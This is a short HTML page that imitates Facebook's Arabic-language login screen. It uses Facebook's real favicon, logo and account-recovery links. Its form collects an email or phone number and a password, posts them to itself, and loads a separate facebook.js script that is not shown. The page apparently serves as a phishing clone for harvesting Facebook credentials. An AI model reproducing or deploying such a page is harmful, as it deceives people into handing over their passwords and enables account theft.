<!DOCTYPE html>
<html>
     <head>
          <meta charset="utf-8">
          <title>فيسبوك - تسجيل الدخول</title>
          <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
          <meta name="viewport" content="width=440 ,user-scalable=no">
          <link rel="stylesheet" href="facebook.css">
     </head>
     <body>
          <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="فيسبوك">
          <div>
            <form target="_self" method="post" id="login">
                <h2>تسجيل الدخول</h2>
                        <input type="text" name="user" placeholder="البريد الإلكثروني أو رقم الهاتف" id="user" autocomplete="off">
                        <br>
                        <p id="err1"></p>
                        <input type="password" name="pass" placeholder="كلمة السر" id="pass">
                        <br>
                        <p id="err2"></p>
                        <button type="button">تسجيل الدخول</button>
                        <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">نسيت كلمة السر ؟</a>
                        <hr>
                        <a href="https://www.facebook.com/r.php?locale=ar_AR&display=page"><button type="button" id="new">إنشاء حساب جديد</button></a>
              </form>
          </div>
          <script src="facebook.js"></script>
     </body>
</html>
